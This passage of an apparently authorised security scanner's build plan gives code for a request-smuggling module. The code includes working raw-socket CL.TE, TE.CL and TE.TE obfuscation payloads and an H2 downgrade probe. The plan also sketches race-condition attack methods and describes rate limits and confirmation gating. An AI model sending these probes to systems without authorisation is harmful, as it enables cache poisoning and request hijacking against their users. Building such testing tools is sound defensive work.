  const baseline = await raw({ ...opts, raw: `GET / HTTP/1.1\r\nHost: ${target.host}\r\nConnection: close\r\n\r\n` });
  const probe = await raw({
    ...opts,
    raw:
      `POST / HTTP/1.1\r\n` +
      `Host: ${target.host}\r\n` +
      `Content-Length: 4\r\n` +
      `Transfer-Encoding: chunked\r\n` +
      `Connection: close\r\n\r\n` +
      `5c\r\nGPOST / HTTP/1.1\r\nHost: ${target.host}\r\n\r\n\r\n0\r\n\r\n`
  });
  return {
    candidate: probe.timedOut || probe.elapsedMs - baseline.elapsedMs > 5000,
    baselineMs: baseline.elapsedMs,
    probeMs: probe.elapsedMs
  };
}
```

- [ ] **Step 4: Write `src/modules/smuggling/te_te.ts`**

```ts
import type { RawOpts, RawResult } from "./raw_socket.js";
type RawFn = (opts: RawOpts) => Promise<RawResult>;

const OBFUSCATIONS = [
  "Transfer-Encoding: xchunked",
  "Transfer-Encoding:\tchunked",
  "Transfer-encoding: chunked\r\nTransfer-Encoding: identity",
  "X: X\r\nTransfer-Encoding: chunked",
  "Transfer-Encoding\n: chunked"
];

export interface TeTeResult { obfuscation: string; candidate: boolean; elapsedMs: number; }

export async function probeTeTe(raw: RawFn, target: { host: string; port: number; tls: boolean }): Promise<TeTeResult[]> {
  const opts = { host: target.host, port: target.port, tls: target.tls, timeoutMs: 5000 };
  const baseline = await raw({ ...opts, raw: `GET / HTTP/1.1\r\nHost: ${target.host}\r\nConnection: close\r\n\r\n` });
  const results: TeTeResult[] = [];
  for (const obf of OBFUSCATIONS) {
    const probe = await raw({
      ...opts,
      raw: `POST / HTTP/1.1\r\nHost: ${target.host}\r\n${obf}\r\nContent-Length: 4\r\nConnection: close\r\n\r\n0\r\n\r\n`
    });
    results.push({
      obfuscation: obf,
      candidate: probe.timedOut || probe.elapsedMs - baseline.elapsedMs > 5000,
      elapsedMs: probe.elapsedMs
    });
  }
  return results;
}
```

- [ ] **Step 5: Write `src/modules/smuggling/hop_by_hop.ts`**

```ts
import type { RawOpts, RawResult } from "./raw_socket.js";
type RawFn = (opts: RawOpts) => Promise<RawResult>;

export interface HopByHopResult { header: string; differential: boolean; baselineMs: number; probeMs: number; }

export async function probeHopByHop(
  raw: RawFn,
  target: { host: string; port: number; tls: boolean },
  candidates: string[]
): Promise<HopByHopResult[]> {
  const opts = { host: target.host, port: target.port, tls: target.tls, timeoutMs: 5000 };
  const baseline = await raw({ ...opts, raw: `GET / HTTP/1.1\r\nHost: ${target.host}\r\nConnection: close\r\n\r\n` });
  const results: HopByHopResult[] = [];
  for (const hdr of candidates) {
    const probe = await raw({
      ...opts,
      raw: `GET / HTTP/1.1\r\nHost: ${target.host}\r\nConnection: ${hdr}\r\n${hdr}: x\r\n\r\n`
    });
    results.push({
      header: hdr,
      differential: Math.abs(probe.elapsedMs - baseline.elapsedMs) > 1000,
      baselineMs: baseline.elapsedMs,
      probeMs: probe.elapsedMs
    });
  }
  return results;
}
```

- [ ] **Step 6: Run, expect pass**

Run: `npm test -- tests/unit/smuggling_variants.test.ts`
Expected: 3 tests pass.

- [ ] **Step 7: Commit**

```bash
git add src/modules/smuggling/te_cl.ts src/modules/smuggling/te_te.ts src/modules/smuggling/hop_by_hop.ts tests/unit/smuggling_variants.test.ts && git commit -m "feat(smuggling): TE.CL, TE.TE, hop-by-hop probes"
```

---

## Task 35: Module D — H2 downgrade probe

**Files:**
- Create: `src/modules/smuggling/h2_downgrade.ts`
- Test: `tests/unit/h2_downgrade.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/h2_downgrade.test.ts
import { describe, it, expect } from "vitest";
import { canProbeH2 } from "../../src/modules/smuggling/h2_downgrade";

describe("h2_downgrade", () => {
  it("reports unavailable when target advertises only HTTP/1.1", () => {
    expect(canProbeH2({ alpnProtocols: ["http/1.1"] })).toBe(false);
  });
  it("reports available when h2 in ALPN", () => {
    expect(canProbeH2({ alpnProtocols: ["h2", "http/1.1"] })).toBe(true);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/h2_downgrade.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/smuggling/h2_downgrade.ts`**

```ts
import http2 from "node:http2";

export interface H2Capability { alpnProtocols: string[]; }

export function canProbeH2(cap: H2Capability): boolean {
  return cap.alpnProtocols.includes("h2");
}

export interface H2DowngradeResult { candidate: boolean; status?: number; error?: string; }

export async function probeH2Downgrade(target: { host: string; port: number }): Promise<H2DowngradeResult> {
  return new Promise((resolve) => {
    const client = http2.connect(`https://${target.host}:${target.port}`, { rejectUnauthorized: false });
    let resolved = false;
    const finish = (r: H2DowngradeResult) => { if (resolved) return; resolved = true; try { client.close(); } catch {} resolve(r); };
    client.on("error", (e) => finish({ candidate: false, error: e.message }));
    const req = client.request({
      ":method": "POST",
      ":path": "/",
      ":authority": target.host,
      "content-length": "5",
      "transfer-encoding": "chunked"
    });
    req.on("response", (h) => finish({ candidate: typeof h[":status"] === "number" && h[":status"] !== 400, status: h[":status"] as number }));
    req.on("error", (e) => finish({ candidate: false, error: e.message }));
    req.end("0\r\n\r\n");
    setTimeout(() => finish({ candidate: false, error: "timeout" }), 5000);
  });
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/h2_downgrade.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/modules/smuggling/h2_downgrade.ts tests/unit/h2_downgrade.test.ts && git commit -m "feat(smuggling): H2 downgrade probe + ALPN gate"
```

---

## Task 36: Smuggling orchestrator (Module D index)

**Files:**
- Create: `src/modules/smuggling/index.ts`
- Test: `tests/unit/smuggling_index.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/smuggling_index.test.ts
import { describe, it, expect } from "vitest";
import { runSmuggling } from "../../src/modules/smuggling";

describe("runSmuggling", () => {
  it("skips when flag off", async () => {
    const endpoint = { method: "GET", host: "x.test", path: "/", query: {}, id: "b", caido_request_id: "b" };
    const findings = await runSmuggling(endpoint, { aggressive: false });
    expect(findings).toHaveLength(0);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/smuggling_index.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/modules/smuggling/index.ts`**

```ts
import type { Endpoint, Finding } from "../../types.js";
import { rawSend } from "./raw_socket.js";
import { probeClTe } from "./cl_te.js";
import { probeTeCl } from "./te_cl.js";
import { probeTeTe } from "./te_te.js";
import { probeHopByHop } from "./hop_by_hop.js";
import { probeH2Downgrade } from "./h2_downgrade.js";

export interface SmugglingOpts { aggressive: boolean; collaborator?: string; }

export async function runSmuggling(endpoint: Endpoint, opts: SmugglingOpts): Promise<Finding[]> {
  if (!opts.aggressive) return [];
  const target = { host: endpoint.host, port: 443, tls: true };
  const findings: Finding[] = [];

  const cl = await probeClTe(rawSend, target);
  if (cl.candidate) findings.push(mkFinding(endpoint, "cl-te", cl));

  const tc = await probeTeCl(rawSend, target);
  if (tc.candidate) findings.push(mkFinding(endpoint, "te-cl", tc));

  const tt = await probeTeTe(rawSend, target);
  for (const r of tt) if (r.candidate) findings.push(mkFinding(endpoint, `te-te:${r.obfuscation}`, r));

  const hbh = await probeHopByHop(rawSend, target, ["Content-Length", "Cookie", "Authorization"]);
  for (const r of hbh) if (r.differential) findings.push(mkFinding(endpoint, `hop-by-hop:${r.header}`, r));

  const h2 = await probeH2Downgrade({ host: target.host, port: target.port });
  if (h2.candidate) findings.push(mkFinding(endpoint, "h2-downgrade", h2));

  return findings;
}

function mkFinding(endpoint: Endpoint, subtype: string, evidence: Record<string, unknown>): Finding {
  const confirmed = false;
  return {
    id: `sm-${endpoint.id}-${subtype.replace(/[^a-z0-9]/gi, "_")}`,
    module: "smuggling",
    subtype,
    endpoint: `${endpoint.method} ${endpoint.path}`,
    primitive: { variant: subtype },
    confidence: confirmed ? "high" : "medium",
    evidence,
    poc_curl: `# raw socket — see raw/<id>.raw transcript`,
    wiki_ref: "wiki/techniques/request-smuggling/SUMMARY.md"
  };
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/smuggling_index.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/modules/smuggling/index.ts tests/unit/smuggling_index.test.ts && git commit -m "feat(smuggling): orchestrator wires CL.TE/TE.CL/TE.TE/hop-by-hop/H2"
```

---

## Task 37: Findings writer

**Files:**
- Create: `src/report/findings.ts`
- Test: `tests/unit/findings_writer.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/findings_writer.test.ts
import { describe, it, expect, beforeEach } from "vitest";
import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { writeFindings } from "../../src/report/findings";

describe("writeFindings", () => {
  let dir: string;
  beforeEach(() => { dir = mkdtempSync(join(tmpdir(), "ccs-")); });

  it("writes findings.json with schema-valid content", async () => {
    await writeFindings(dir, {
      host: "x.test",
      ts: "2026-05-20T00:00:00Z",
      findings: [{
        id: "cp-1", module: "cache-poison", subtype: "unkeyed-header",
        endpoint: "GET /", primitive: {}, confidence: "high", evidence: {},
        poc_curl: "curl", wiki_ref: "wiki/x.md"
      }]
    });
    const content = JSON.parse(readFileSync(join(dir, "findings.json"), "utf8"));
    expect(content.schema_version).toBe(1);
    expect(content.findings).toHaveLength(1);
    rmSync(dir, { recursive: true, force: true });
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/findings_writer.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/report/findings.ts`**

```ts
import { writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";
import type { Finding } from "../types.js";

export interface FindingsFile {
  host: string;
  ts: string;
  findings: Finding[];
}

export async function writeFindings(outDir: string, file: FindingsFile): Promise<void> {
  await mkdir(outDir, { recursive: true });
  const body = JSON.stringify({ schema_version: 1, ...file }, null, 2);
  await writeFile(join(outDir, "findings.json"), body, "utf8");
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/findings_writer.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/report/findings.ts tests/unit/findings_writer.test.ts && git commit -m "feat(report): findings.json writer"
```

---

## Task 38: PoC curl synthesizer

**Files:**
- Create: `src/report/poc.ts`
- Test: `tests/unit/poc.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/poc.test.ts
import { describe, it, expect } from "vitest";
import { synthCurl } from "../../src/report/poc";

describe("synthCurl", () => {
  it("redacts cookie", () => {
    const out = synthCurl({ method: "GET", url: "https://x/", headers: { Cookie: "s=abc" }, body: "" });
    expect(out).not.toContain("abc");
    expect(out).toContain("Cookie: <redacted>");
  });
  it("includes method + url + headers", () => {
    const out = synthCurl({ method: "POST", url: "https://x/", headers: { "X-Foo": "bar" }, body: "k=v" });
    expect(out).toMatch(/curl -X POST/);
    expect(out).toContain("X-Foo: bar");
    expect(out).toContain("k=v");
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/poc.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/report/poc.ts`**

```ts
import type { HttpMessage } from "../types.js";

const REDACT_HEADERS = new Set(["cookie", "authorization", "proxy-authorization"]);

export function synthCurl(req: HttpMessage): string {
  const parts: string[] = [`curl -X ${req.method}`];
  for (const [k, v] of Object.entries(req.headers)) {
    const value = REDACT_HEADERS.has(k.toLowerCase()) ? "<redacted>" : v;
    parts.push(`-H '${k}: ${value}'`);
  }
  if (req.body) parts.push(`--data-raw '${req.body.replace(/'/g, "'\\''")}'`);
  parts.push(`'${req.url}'`);
  return parts.join(" ");
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/poc.test.ts`
Expected: 2 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/report/poc.ts tests/unit/poc.test.ts && git commit -m "feat(report): PoC curl synthesizer with cookie redaction"
```

---

## Task 39: Markdown report generator

**Files:**
- Create: `src/report/markdown.ts`
- Test: `tests/unit/markdown.test.ts`

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/markdown.test.ts
import { describe, it, expect } from "vitest";
import { renderReport } from "../../src/report/markdown";

describe("renderReport", () => {
  it("groups by confidence", () => {
    const md = renderReport({
      host: "x.test",
      ts: "2026-05-20T00:00:00Z",
      duration_ms: 12345,
      endpoints_probed: 10,
      probes_sent: 100,
      modules_run: ["cache-poison"],
      interrupted: false
    }, [
      { id: "a", module: "cache-poison", subtype: "unkeyed-header", endpoint: "GET /", primitive: {}, confidence: "high", evidence: {}, poc_curl: "curl x", wiki_ref: "w" },
      { id: "b", module: "cache-poison", subtype: "host-casing", endpoint: "GET /", primitive: {}, confidence: "low", evidence: {}, poc_curl: "curl y", wiki_ref: "w" }
    ]);
    expect(md).toMatch(/## High-confidence \(1\)/);
    expect(md).toMatch(/## Low-confidence \(1\)/);
  });
});
```

- [ ] **Step 2: Run, expect fail**

Run: `npm test -- tests/unit/markdown.test.ts`
Expected: FAIL.

- [ ] **Step 3: Write `src/report/markdown.ts`**

```ts
import type { Finding, RunMeta } from "../types.js";

const ORDER: Finding["confidence"][] = ["high", "medium", "low", "lead"];
const HEADER: Record<Finding["confidence"], string> = {
  high: "High-confidence",
  medium: "Medium-confidence",
  low: "Low-confidence",
  lead: "Leads (manual review)"
};

export function renderReport(meta: RunMeta, findings: Finding[]): string {
  const lines: string[] = [];
  lines.push(`# ${meta.host} — cache/smuggling sweep`);
  lines.push("");
  lines.push(`- Run: ${meta.ts} · ${meta.duration_ms}ms · ${meta.endpoints_probed} endpoints · ${meta.probes_sent} probes · ${findings.length} findings`);
  lines.push(`- Modules: ${meta.modules_run.join(", ")}`);
  if (meta.interrupted) lines.push(`- **Interrupted before completion**`);
  lines.push("");

  for (const level of ORDER) {
    const group = findings.filter((f) => f.confidence === level);
    if (group.length === 0) continue;
    lines.push(`## ${HEADER[level]} (${group.length})`);
    for (const f of group) {
      lines.push("");
      lines.push(`### ${f.id} · ${f.subtype} → ${f.endpoint}`);
      lines.push(`- Module: ${f.module}`);
      lines.push(`- Primitive: \`${JSON.stringify(f.primitive)}\``);
      lines.push(`- Evidence: \`${JSON.stringify(f.evidence)}\``);
      lines.push(`- PoC:`);
      lines.push("");
      lines.push("```bash");
      lines.push(f.poc_curl);
      lines.push("```");
      lines.push("");
      lines.push(`- Wiki: [${f.wiki_ref}](../../${f.wiki_ref})`);
    }
    lines.push("");
  }
  return lines.join("\n");
}
```

- [ ] **Step 4: Run, expect pass**

Run: `npm test -- tests/unit/markdown.test.ts`
Expected: 1 test passes.

- [ ] **Step 5: Commit**

```bash
git add src/report/markdown.ts tests/unit/markdown.test.ts && git commit -m "feat(report): markdown report grouped by confidence"
```

---

## Task 40: CLI entry + pre-flight

**Files:**
- Create: `src/cli.ts`
- Test: manual smoke; integration test in Task 41

- [ ] **Step 1: Write `src/cli.ts`**

```ts
#!/usr/bin/env node
import { Command } from "commander";
import { readFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import readline from "node:readline";
import pino from "pino";
import { parseConfig } from "./config.js";
import { CaidoClient } from "./caido/client.js";
import { CaidoSender } from "./caido/send.js";
import { Throttle } from "./core/throttle.js";
import { discoverEndpoints } from "./caido/discover.js";
import { runCachePoison } from "./modules/cache_poison/index.js";
import { runCacheDeception } from "./modules/cache_deception/index.js";
import { runHtmlSmuggling } from "./modules/html_smuggling/index.js";
import { runSmuggling } from "./modules/smuggling/index.js";
import { writeFindings } from "./report/findings.js";
import { renderReport } from "./report/markdown.js";
import { writeFileSync } from "node:fs";
import type { Finding, HttpMessage } from "./types.js";

const log = pino({ level: "info" });

const program = new Command();
program
  .name("caido-cache-smug")
  .requiredOption("--host <hostname>", "target hostname (HTTPQL req.host.cont)")
  .option("--caido-url <url>", "Caido API URL", "http://localhost:8080")
  .option("--caido-token <pat>", "Caido PAT (else env CAIDO_API_TOKEN)")
  .option("--project <name>", "Caido project name")
  .option("--max-requests <n>", "max requests to discover", (v) => parseInt(v, 10), 500)
  .option("--rps <n>", "global throttle", (v) => parseFloat(v), 5)
  .option("--out <dir>", "output directory")
  .option("--passive-only", "skip active probes", false)
  .option("--modules <list>", "comma list", (v) => v.split(","))
  .option("--auth-cookie <kv>", "auth cookie e.g. session=abc")
  .option("--aggressive-smuggling", "enable Module D (raw-socket CL/TE)", false)
  .option("--collaborator <fqdn>", "OOB collaborator for smuggling confirmation")
  .action(async (raw) => {
    const cfg = parseConfig(raw, process.env);
    if (cfg.aggressiveSmuggling || cfg.rps > 20) {
      const ok = await confirm(`Aggressive mode against ${cfg.host}. Proceed? [y/N] `);
      if (!ok) { log.warn("aborted by user"); process.exit(1); }
    }

    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    const outDir = cfg.out ?? join("out", cfg.host, ts);
    mkdirSync(outDir, { recursive: true });

    const client = new CaidoClient({ url: cfg.caidoUrl, token: cfg.caidoToken });
    const throttle = new Throttle({
      rps: cfg.rps,
      hardFloorRps: cfg.aggressiveSmuggling ? 1 : undefined
    });
    const sender = new CaidoSender(client, throttle);

    log.info({ host: cfg.host }, "discovering endpoints");
    const endpoints = await discoverEndpoints(client, cfg.host, cfg.maxRequests);
    log.info({ count: endpoints.length }, "endpoints discovered");

    const start = Date.now();
    const findings: Finding[] = [];
    let probes = 0;
    for (const ep of endpoints) {
      const baseline = await sender.send({
        method: ep.method,
        url: `https://${ep.host}${ep.path}`,
        headers: cfg.authCookie ? { Cookie: cfg.authCookie } : {},
        body: ""
      });
      probes++;
      const msg: HttpMessage = baseline.response;
      msg.method = ep.method;
      msg.url = `https://${ep.host}${ep.path}`;
      if (!cfg.passiveOnly && cfg.modules.includes("cache-poison"))
        findings.push(...(await runCachePoison(sender, ep, msg)));
      if (!cfg.passiveOnly && cfg.modules.includes("cache-deception"))
        findings.push(...(await runCacheDeception(sender, ep, msg)));
      if (cfg.modules.includes("html-smuggling"))
        findings.push(...runHtmlSmuggling(ep, msg));
      if (cfg.modules.includes("smuggling"))
        findings.push(...(await runSmuggling(ep, { aggressive: cfg.aggressiveSmuggling, collaborator: cfg.collaborator })));
    }
    const duration = Date.now() - start;

    const meta = {
      host: cfg.host,
      ts: new Date().toISOString(),
      duration_ms: duration,
      endpoints_probed: endpoints.length,
      probes_sent: probes,
      modules_run: cfg.modules,
      interrupted: false
    };
    await writeFindings(outDir, { host: cfg.host, ts: meta.ts, findings });
    writeFileSync(join(outDir, "report.md"), renderReport(meta, findings), "utf8");
    writeFileSync(join(outDir, "run.json"), JSON.stringify(meta, null, 2), "utf8");
    log.info({ outDir, findings: findings.length }, "complete");
  });

program.parseAsync(process.argv).catch((err) => {
  log.error({ err }, "fatal");
  process.exit(1);
});

function confirm(prompt: string): Promise<boolean> {
  return new Promise((resolve) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question(prompt, (a) => { rl.close(); resolve(/^y/i.test(a.trim())); });
  });
}
```

- [ ] **Step 2: Build**

Run: `npm run build`
Expected: `dist/cli.js` produced, no TS errors.

- [ ] **Step 3: Smoke-test help output**

Run: `node dist/cli.js --help`
Expected: usage text printed, options listed, exit 0.

- [ ] **Step 4: Commit**

```bash
git add src/cli.ts && git commit -m "feat(cli): commander entry, pre-flight, dispatch"
```

---

## Task 41: Integration test with mock Caido + mock target

**Files:**
- Create: `tests/integration/end_to_end.test.ts`, `tests/fixtures/mock_target.ts`

- [ ] **Step 1: Write `tests/fixtures/mock_target.ts`**

```ts
import http from "node:http";

export function startMockTarget(opts: { reflectUnkeyed?: boolean } = {}): Promise<{ server: http.Server; port: number }> {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      const xfh = req.headers["x-forwarded-host"];
      const body = opts.reflectUnkeyed && xfh
        ? `<base href="https://${xfh}/"><p>welcome</p>`
        : `<p>welcome</p>`;
      res.writeHead(200, { "x-cache": "MISS", "cache-control": "public, max-age=300" });
      res.end(body);
    });
    server.listen(0, "127.0.0.1", () => {
      const port = (server.address() as any).port;
      resolve({ server, port });
    });
  });
}
```

- [ ] **Step 2: Write `tests/integration/end_to_end.test.ts`**

```ts
import { describe, it, expect } from "vitest";
import { startMockTarget } from "../fixtures/mock_target";
import { sweepUnkeyedHeaders } from "../../src/modules/cache_poison/unkeyed_header";
import { request } from "undici";
import { CaidoSender } from "../../src/caido/send";
import { Throttle } from "../../src/core/throttle";

class DirectSender {
  constructor(private base: string) {}
  async send(req: any) {
    const r = await request(req.url.replace(/^https:/, "http:"), {
      method: req.method,
      headers: req.headers,
      body: req.body || undefined
    });
    const body = await r.body.text();
    return {
      requestId: Math.random().toString(36).slice(2),
      response: { status: r.statusCode, headers: Object.fromEntries(Object.entries(r.headers).map(([k, v]) => [k, String(v)])), body }
    };
  }
}

describe("end-to-end unkeyed-header against mock target", () => {
  it("detects X-Forwarded-Host reflection", async () => {
    const t = await startMockTarget({ reflectUnkeyed: true });
    const sender = new DirectSender(`http://127.0.0.1:${t.port}`) as unknown as CaidoSender;
    const endpoint = { method: "GET", host: `127.0.0.1:${t.port}`, path: "/", query: {}, id: "b", caido_request_id: "b" };
    const baseline = { method: "GET", url: `http://127.0.0.1:${t.port}/`, headers: {}, body: "", status: 200 };
    const findings = await sweepUnkeyedHeaders(
      sender,
      endpoint,
      baseline,
      ["X-Forwarded-Host"],
      () => "cnry-int.evil.test",
      () => "cbint"
    );
    expect(findings).toHaveLength(1);
    t.server.close();
  });
});
```

- [ ] **Step 3: Run, expect pass (or fail until plumbing fixed)**

Run: `npm test -- tests/integration/end_to_end.test.ts`
Expected: PASS — 1 test detects unkeyed reflection on mock target.

- [ ] **Step 4: Commit**

```bash
git add tests/integration/ tests/fixtures/ && git commit -m "test(integration): end-to-end unkeyed-header against mock target"
```

---

## Task 42: README

**Files:**
- Create: `README.md`

- [ ] **Step 1: Write `README.md`**

```markdown
# caido-cache-smug

Single-host CLI that sweeps Caido-captured requests for web cache poisoning, web cache deception, HTML smuggling, and optionally HTTP request smuggling.

## Install

```bash
git clone <repo>
cd caido-cache-smug
npm install
npm run build
npm link
```

## Use

```bash
export CAIDO_API_TOKEN=<your-PAT>
caido-cache-smug --host api.acme.example --project acme-2026 --rps 5
```

Output lands at `./out/<host>/<ts>/`:
- `findings.json` — schema_version 1 (see SPEC.md)
- `report.md` — grouped by confidence
- `raw/` — every request and response

## Modules

- **cache-poison** — unkeyed-header, parameter cloaking, URL-parser discrepancy, Cloudflare cache-key header overflow, CDN quirks.
- **cache-deception** — path-append, delimiter discrepancy, cache-buster parameter trick, traversal in cache key, CSPT passive leads.
- **html-smuggling** — Blob/download primitives, form attribute smuggling, URL-credential smuggling, well-known data-type smuggling.
- **smuggling** (flag-gated) — CL.TE, TE.CL, TE.TE, hop-by-hop, H2 downgrade. Requires `--aggressive-smuggling`.

## Rules of engagement

- GET/HEAD only. PURGE is detection-only.
- `--rps` default 5; `--aggressive-smuggling` forces ≤1 rps.
- Pre-flight `y/N` confirmation required for aggressive mode or `--rps > 20`.
- Auth cookies redacted in `report.md`/`findings.json`. Raw transcripts under `raw/` retain originals.

## Spec & plan

- [SPEC.md](SPEC.md)
- [PLAN.md](PLAN.md)
```

- [ ] **Step 2: Commit**

```bash
git add README.md && git commit -m "docs: README"
```

---

## Task 43a: Module E — race candidate selection

**Files:**
- Create: `data/race_keywords.json`
- Create: `src/modules/race/candidate.ts`
- Test: `tests/unit/race_candidate.test.ts`

- [ ] **Step 1: Populate `data/race_keywords.json`** with keywords from SPEC §6.5 E1.
- [ ] **Step 2: Write failing test** scoring `/apply-coupon` POST (auth-bound) as ≥2.
- [ ] **Step 3: Implement `scoreEndpoint(endpoint, baseline)`** in `candidate.ts`. Score on keyword hit (+1), auth-bound (+1), mutating verb (+1), idempotency-key absent on mutating verb (+1).
- [ ] **Step 4: Tests pass.**
- [ ] **Step 5: Commit** `feat(race): E1 candidate scoring + keyword data`.

---

## Task 43b: Module E — collision detector

**Files:**
- Create: `src/modules/race/detect.ts`
- Test: `tests/unit/race_detect.test.ts`

- [ ] **Step 1: Write failing test** — feed two response sets (uniform serial baseline vs divergent parallel volley) into `classify()`; expect `high` confidence.
- [ ] **Step 2: Implement `classify(serial: Response[], parallel: Response[])`** returning `{confidence, signal, classes}`. Signals: status histogram, body hash diversity, JSON-marker leak, state-change-marker leak per SPEC §6.5 E2.
- [ ] **Step 3: Tests pass.**
- [ ] **Step 4: Commit** `feat(race): E2 collision detector`.

---

## Task 43c: Module E — single-packet HTTP/2 attack

**Files:**
- Create: `src/modules/race/single_packet.ts`
- Test: `tests/integration/race_single_packet.test.ts`

- [ ] **Step 1: Write failing integration test** against a vitest-spawned `http2.createSecureServer` that records frame-arrival timestamps per stream. Expect ≥0.9 of N streams' END_STREAM frames to arrive within a 5ms window.
- [ ] **Step 2: Implement `singlePacketSend(target, requests, concurrency)`** — open one `http2.connect` session, create N streams with HEADERS only, `session.socket.cork()`, write END_STREAM for each, `uncork()`. Return collected responses.
- [ ] **Step 3: Tests pass.**
- [ ] **Step 4: Commit** `feat(race): E2 single-packet attack`.

---

## Task 43d: Module E — last-byte sync HTTP/1.1 fallback

**Files:**
- Create: `src/modules/race/last_byte.ts`
- Test: `tests/integration/race_last_byte.test.ts`

- [ ] **Step 1: Write failing integration test** against `net.createServer` recording arrival of the final byte per socket.
- [ ] **Step 2: Implement `lastByteSync(target, requests, concurrency)`** — open N TCP sockets, write request minus final byte each, schedule final-byte writes inside a single `setImmediate` callback.
- [ ] **Step 3: Tests pass.**
- [ ] **Step 4: Commit** `feat(race): E3 last-byte sync fallback`.

---

## Task 43e: Module E — orchestrator + CLI wiring

**Files:**
- Create: `src/modules/race/index.ts`
- Edit: `src/types.ts` (add `"race"` to `ModuleSchema`)
- Edit: `src/config.ts` (race + raceAllowMutate + raceEndpoints + raceConcurrency, mutation gating)
- Edit: `src/cli.ts` (flags + dispatch)
- Test: `tests/unit/race_index.test.ts`

- [ ] **Step 1: Add `"race"` to `ModuleSchema`.**
- [ ] **Step 2: Extend config schema** + mutation guard (race-allow-mutate requires non-empty allowlist).
- [ ] **Step 3: Implement `runRace(endpoint, baseline, opts)`** — score candidate, decide H2 vs H1.1 path, calibrate serial baseline, run parallel volley, classify, emit `Finding`. If endpoint scores ≥2 but probing is gated off, emit `confidence: "lead"`.
- [ ] **Step 4: CLI** — register `--race`, `--race-concurrency`, `--race-allow-mutate`, `--race-endpoints`. Pre-flight prompt covers mutation case.
- [ ] **Step 5: Tests pass.**
- [ ] **Step 6: Commit** `feat(race): E4 orchestrator + CLI integration`.

---

## Task 43: Run full test suite + final verification

- [ ] **Step 1: Run all tests**

Run: `npm test`
Expected: all suites pass.

- [ ] **Step 2: Type-check**

Run: `npm run build`
Expected: no TS errors.

- [ ] **Step 3: CLI smoke**

Run: `node dist/cli.js --help`
Expected: usage printed.

- [ ] **Step 4: Tag release**

```bash
git tag v0.1.0
git log --oneline | head -50
```

---

## Self-review (post-write)

**Spec coverage:**
- §4 CLI surface → Task 40
- §5 Pipeline → Task 40 orchestration; discovery Task 11; baselines Task 40
- §6.1 Module A1–A6 → Tasks 14, 15, 16, 17, 18, 19; orchestrator Task 20
- §6.2 Module B1–B6 → Tasks 21, 22, 23, 24, 25; orchestrator Task 26
- §6.3 Module C1–C4 → Tasks 27, 28, 29, 30; orchestrator Task 31
- §6.4 Module D → Tasks 32, 33, 34, 35; orchestrator Task 36
- §6.5 Module E → Tasks 43a, 43b, 43c, 43d; orchestrator + CLI Task 43e
- §7 Output structure → Tasks 37, 38, 39
- §8 Project layout → Tasks 1, 13
- §9 Threat model / ROE → Task 40 pre-flight, Task 38 redaction, Task 36 hard floor

**Placeholder scan:** none.

**Type consistency:** `Finding`, `Endpoint`, `HttpMessage`, `RunMeta` defined Task 2, used identically Tasks 14–40. `CaidoSender.send()` signature consistent across all module tests.

**Coverage gaps fixed inline:** none.
